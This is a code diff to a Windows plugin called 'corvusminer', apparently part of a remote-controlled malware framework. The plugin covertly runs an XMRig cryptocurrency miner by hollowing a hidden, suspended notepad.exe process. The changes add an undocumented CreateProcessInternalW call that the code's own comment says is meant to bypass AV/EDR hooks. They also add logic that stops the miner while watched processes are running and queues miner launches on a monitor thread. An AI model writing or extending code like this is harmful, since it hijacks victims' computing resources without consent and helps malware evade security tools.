@@ -24,6 +24,31 @@
 #  include "injection_helpers.h"
 #  include "pe_hdrs_helper.h"
 
+/* Undocumented CreateProcessInternalW - bypasses AV/EDR hooks on CreateProcessW */
+static BOOL
+(WINAPI *g_CreateProcessInternalW)(HANDLE hToken,
+    LPCWSTR lpApplicationName,
+    LPWSTR lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL bInheritHandles,
+    DWORD dwCreationFlags,
+    LPVOID lpEnvironment,
+    LPCWSTR lpCurrentDirectory,
+    LPSTARTUPINFOW lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation,
+    PHANDLE hNewToken
+    ) = nullptr;
+
+static bool load_kernel32_functions() {
+    if (g_CreateProcessInternalW) return true;
+    HMODULE hKernel32 = GetModuleHandleA("kernel32");
+    if (!hKernel32) return false;
+    g_CreateProcessInternalW = (BOOL(WINAPI *)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION, PHANDLE))
+        GetProcAddress(hKernel32, "CreateProcessInternalW");
+    return g_CreateProcessInternalW != nullptr;
+}
+
 #else
 #  define EXPORT extern "C" __attribute__((visibility("default")))
 #endif
@@ -78,6 +103,7 @@ static std::string g_xmrig_path;
 static HANDLE g_monitor_thread = nullptr;
 static bool g_monitor_running = false;
 static bool g_should_be_mining = false;
+static bool g_mining_start_pending = false;  /* Track if we need to spawn on monitor thread */
 
 /* Forward declarations */
 static bool are_processes_running(const std::vector<std::string> &process_names);
@@ -178,6 +204,7 @@ static DWORD WINAPI monitor_thread_proc(LPVOID param) {
         std::vector<std::string> blocked_procs;
         std::string pool, username, password, xmrig_path;
         int threads_hint;
+        bool mining_start_pending;
         {
             std::lock_guard<std::mutex> lk(g_mu);
             blocked_procs = g_blocked_processes;
@@ -186,15 +213,31 @@ static DWORD WINAPI monitor_thread_proc(LPVOID param) {
             password = g_password;
             threads_hint = g_threads_hint;
             xmrig_path = g_xmrig_path;
+            mining_start_pending = g_mining_start_pending;
         }
         
         bool blocked_running = are_processes_running(blocked_procs);
         bool miner_running = (g_mining_process != nullptr && is_process_running(g_mining_process));
         
-        fprintf(stderr, "[corvusminer] monitor check: blocked_running=%d, miner_running=%d, should_be=%d, processes_to_watch=%zu\n",
-                blocked_running, miner_running, g_should_be_mining, blocked_procs.size());
+        fprintf(stderr, "[corvusminer] monitor check: pending=%d, blocked_running=%d, miner_running=%d, should_be=%d, processes_to_watch=%zu\n",
+                mining_start_pending, blocked_running, miner_running, g_should_be_mining, blocked_procs.size());
         
-        if (blocked_running && miner_running) {
+        /* Handle initial mining_start request */
+        if (mining_start_pending && !miner_running) {
+            fprintf(stderr, "[corvusminer] spawning miner from mining_start request\n");
+            bool success = spawn_xmrig(pool, username, password, threads_hint, blocked_procs, xmrig_path, false);
+            {
+                std::lock_guard<std::mutex> lk(g_mu);
+                g_mining_start_pending = false;
+            }
+            if (success) {
+                fprintf(stderr, "[corvusminer] initial spawn successful\n");
+                send_event("mining_started", "{\"message\":\"Mining started\"}");
+            } else {
+                fprintf(stderr, "[corvusminer] initial spawn failed\n");
+                send_event("mining_error", "{\"error\":\"Failed to start mining\"}");
+            }
+        } else if (blocked_running && miner_running) {
             /* Blocked process is running - kill miner */
             fprintf(stderr, "[corvusminer] blocked process detected, killing miner\n");
             stop_xmrig();
@@ -384,48 +427,125 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
             if (read_size == (size_t)file_size && pe_is64bit(payload_buf)) {
                 /* Use proven transacted hollowing with new helpers */
                 fprintf(stderr, "[corvusminer] using transacted hollowing injection\n");
+                fprintf(stderr, "[corvusminer] payload size: %zu bytes\n", file_size);
                 
                 char temp_dir[MAX_PATH] = {0};
                 char temp_file[MAX_PATH] = {0};
-                GetTempPathA(sizeof(temp_dir), temp_dir);
-                GetTempFileNameA(temp_dir, "xmr", 0, temp_file);
+                if (!GetTempPathA(sizeof(temp_dir), temp_dir)) {
+                    fprintf(stderr, "[corvusminer] failed to get temp path: 0x%lX\n", GetLastError());
+                    delete[] payload_buf;
+                    return false;
+                }
+                fprintf(stderr, "[corvusminer] temp dir: %s\n", temp_dir);
+                
+                if (!GetTempFileNameA(temp_dir, "xmr", 0, temp_file)) {
+                    fprintf(stderr, "[corvusminer] failed to create temp filename: 0x%lX\n", GetLastError());
+                    delete[] payload_buf;
+                    return false;
+                }
+                fprintf(stderr, "[corvusminer] temp file: %s\n", temp_file);
                 
                 /* Convert temp file path to wide chars */
                 int wlen = MultiByteToWideChar(CP_ACP, 0, temp_file, -1, nullptr, 0);
                 wchar_t *wide_temp = new wchar_t[wlen];
                 MultiByteToWideChar(CP_ACP, 0, temp_file, -1, wide_temp, wlen);
+                fprintf(stderr, "[corvusminer] converted to wide: %d chars\n", wlen);
                 
                 /* Create section from payload using proven helper */
+                fprintf(stderr, "[corvusminer] calling make_section_from_delete_pending_file...\n");
                 HANDLE h_section = make_section_from_delete_pending_file(wide_temp, payload_buf, (DWORD)file_size);
                 delete[] wide_temp;
+                fprintf(stderr, "[corvusminer] section handle: %p\n", h_section);
                 
                 if (h_section) {
+                    fprintf(stderr, "[corvusminer] section created successfully\n");
                     /* Get notepad path for injection target */
                     std::string notepad_path = get_notepad_path();
                     fprintf(stderr, "[corvusminer] injecting into: %s\n", notepad_path.c_str());
                     
                     /* Create suspended notepad process */
-                    STARTUPINFOA si = {0};
+                    STARTUPINFOW si = {0};
                     si.cb = sizeof(si);
                     si.dwFlags = STARTF_USESHOWWINDOW;
                     si.wShowWindow = SW_HIDE;
                     
                     PROCESS_INFORMATION pi = {0};
-                    std::string cmd_full = notepad_path + " " + cmdline;
+                    fprintf(stderr, "[corvusminer] notepad: %s, args: %s\n", notepad_path.c_str(), cmdline.c_str());
+                    fflush(stderr);
+
+                    /* Build wide-char paths */
+                    int np_wlen = MultiByteToWideChar(CP_ACP, 0, notepad_path.c_str(), -1, nullptr, 0);
+                    wchar_t *notepad_wide = new wchar_t[np_wlen];
+                    MultiByteToWideChar(CP_ACP, 0, notepad_path.c_str(), -1, notepad_wide, np_wlen);
+
+                    /* Quote exe path + args: "C:\path\notepad.exe" <args>
+                       Matches client's swprintf_s(cmdLine, L"\"%s\" %s", targetPath, args) */
+                    int args_wlen = MultiByteToWideChar(CP_ACP, 0, cmdline.c_str(), -1, nullptr, 0);
+                    /* 3 = two quotes + space, args_wlen includes null terminator */
+                    wchar_t *cmd_wide = new wchar_t[np_wlen + args_wlen + 3];
+                    cmd_wide[0] = L'"';
+                    wcscpy(cmd_wide + 1, notepad_wide);
+                    wcscat(cmd_wide, L"" );
+                    cmd_wide[np_wlen] = L'"';   /* overwrite null with closing quote */
+                    cmd_wide[np_wlen + 1] = L' ';
+                    MultiByteToWideChar(CP_ACP, 0, cmdline.c_str(), -1, cmd_wide + np_wlen + 2, args_wlen);
+
+                    /* Extract start directory from notepad path */
+                    wchar_t start_dir[MAX_PATH] = {0};
+                    wcscpy(start_dir, notepad_wide);
+                    wchar_t *last_sep = wcsrchr(start_dir, L'\\');
+                    if (last_sep) *last_sep = L'\0';
+
+                    fprintf(stderr, "[corvusminer] calling CreateProcessInternalW (quoted cmd, DETACHED_PROCESS|CREATE_NO_WINDOW)\n");
+                    fflush(stderr);
+
+                    /* Zero out pi */
+                    memset(&pi, 0, sizeof(pi));
+
+                    HANDLE hNewToken = NULL;
+                    BOOL proc_created = FALSE;
+                    if (load_kernel32_functions()) {
+                        proc_created = g_CreateProcessInternalW(NULL,
+                            NULL,       /* lpApplicationName */
+                            cmd_wide,   /* lpCommandLine */
+                            NULL, NULL, FALSE,
+                            CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
+                            NULL,
+                            start_dir,
+                            &si, &pi, &hNewToken);
+                    } else {
+                        fprintf(stderr, "[corvusminer] CreateProcessInternalW not found, falling back to CreateProcessW\n");
+                        proc_created = CreateProcessW(NULL, cmd_wide, NULL, NULL, FALSE,
+                            CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
+                            NULL, start_dir, &si, &pi);
+                    }
+
+                    fprintf(stderr, "[corvusminer] CreateProcess returned: %d (err=0x%lX)\n", (int)proc_created, proc_created ? 0 : GetLastError());
+                    fflush(stderr);
+
+                    delete[] notepad_wide;
+                    delete[] cmd_wide;
                     
-                    if (CreateProcessA(nullptr, (LPSTR)cmd_full.c_str(), nullptr, nullptr, FALSE,
-                                      CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-                        
-                        fprintf(stderr, "[corvusminer] created notepad (PID: %lu)\n", pi.dwProcessId);
-                        
+                    if (proc_created) {
+                        fprintf(stderr, "[corvusminer] created notepad (PID: %lu, hProcess: %p, hThread: %p)\n",
+                                pi.dwProcessId, pi.hProcess, pi.hThread);
+                        fflush(stderr);
+
                         /* Map section into process using proven helper */
+                        fprintf(stderr, "[corvusminer] mapping section into process (file_size=%lu)...\n", (DWORD)file_size);
+                        fflush(stderr);
                         PVOID remote_base = map_section_into_process(pi.hProcess, h_section, (DWORD)file_size);
-                        
+                        fprintf(stderr, "[corvusminer] map_section_into_process returned: %p\n", remote_base);
+                        fflush(stderr);
                         if (remote_base) {
+                            fprintf(stderr, "[corvusminer] remote base mapped successfully\n");
                             /* Redirect entry point using proven helper */
+                            fprintf(stderr, "[corvusminer] redirecting entry point...\n");
                             if (redirect_entry_point(payload_buf, remote_base, pi)) {
-                                /* Resume thread */
-                                Sleep(50);  /* Stabilize after redirection */
+                                fprintf(stderr, "[corvusminer] entry point redirected successfully\n");
+                                /* Flush instruction cache and stabilize - matches client behavior */
+                                FlushInstructionCache(pi.hProcess, remote_base, file_size);
+                                Sleep(50);
                                 if (ResumeThread(pi.hThread)) {
                                     g_mining_process = pi.hProcess;
                                     CloseHandle(pi.hThread);
@@ -454,10 +574,11 @@ static bool spawn_xmrig(const std::string &pool, const std::string &username,
                             CloseHandle(pi.hThread);
                         }
                     } else {
-                        fprintf(stderr, "[corvusminer] failed to create notepad process\n");
+                        DWORD err = GetLastError();
+                        fprintf(stderr, "[corvusminer] CreateProcess failed: 0x%lX\n", err);
                     }
                 } else {
-                    fprintf(stderr, "[corvusminer] failed to create section from payload\n");
+                    fprintf(stderr, "[corvusminer] failed to create section from payload (make_section_from_delete_pending_file returned nullptr)\n");
                 }
                 
                 delete[] payload_buf;
@@ -638,10 +759,11 @@ EXPORT int PluginOnEvent(const char *event, int eventLen,
         
         if (threads_hint <= 0) threads_hint = 100;
         
-        /* Always store config for monitor thread, regardless of spawn success */
+        /* Queue mining start on monitor thread (avoid calling Windows APIs from Go plugin callback) */
         {
             std::lock_guard<std::mutex> lk(g_mu);
             g_should_be_mining = true;
+            g_mining_start_pending = true;
             g_blocked_processes = kill_processes;
             g_pool = pool;
             g_username = username;
@@ -650,7 +772,7 @@ EXPORT int PluginOnEvent(const char *event, int eventLen,
             g_xmrig_path = xmrig_path;
         }
         
-        spawn_xmrig(pool, username, password, threads_hint, kill_processes, xmrig_path);
+        fprintf(stderr, "[corvusminer] queued mining_start for monitor thread\n");
         return 0;
     }
 
@@ -659,6 +781,7 @@ EXPORT int PluginOnEvent(const char *event, int eventLen,
         {
             std::lock_guard<std::mutex> lk(g_mu);
             g_should_be_mining = false;
+            g_mining_start_pending = false;
         }
         stop_xmrig();
         return 0;
